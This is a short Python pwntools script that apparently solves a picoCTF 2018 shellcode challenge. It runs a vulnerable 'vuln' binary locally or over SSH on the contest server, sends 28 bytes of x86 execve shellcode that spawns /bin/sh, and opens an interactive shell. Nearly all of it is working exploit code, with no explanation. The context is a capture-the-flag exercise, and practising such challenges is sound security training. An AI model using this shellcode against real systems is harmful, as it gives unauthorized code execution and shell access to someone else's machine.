#!/usr/bin/env python

from pwn import *
import sys

argv = len(sys.argv)

#start process locally or remotely based on args given
if argv > 1:
	from getpass import getpass
	ssh = ssh(host='2018shell.picoctf.com', user='ems3t', password=getpass())
	p = ssh.process('vuln', cwd='/problems/shellcode_0_48532ce5a1829a772b64e4da6fa58eed')
else:
	p = process('./vuln')

#/bin/dash 28 bytes
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

p.sendline(shellcode)
p.interactive()